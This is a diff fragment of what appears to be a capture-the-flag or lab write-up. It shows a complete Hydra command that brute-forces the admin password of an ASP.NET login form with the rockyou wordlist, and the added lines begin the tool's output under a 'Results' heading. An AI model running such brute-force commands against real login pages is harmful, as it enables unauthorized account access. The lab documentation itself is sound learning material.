@@ -133,6 +133,11 @@ Using:
 
 ```text
 # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.39.227 http-post-form "/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
+```
+
+Results:
+
+```text
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-30 05:11:49
